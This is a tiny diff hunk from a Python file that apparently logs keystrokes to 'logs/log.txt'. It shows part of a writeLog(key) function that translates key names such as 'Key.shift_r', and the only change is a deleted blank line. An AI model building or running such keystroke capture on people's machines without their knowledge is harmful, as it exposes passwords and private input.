@@ -5,7 +5,6 @@ logFile : str = 'logs/log.txt'
 
 def writeLog(key):
     keydata = str(key).replace("'", "")
-
     translate_keys = {
         "space": " ",
         "Key.shift_r": "",
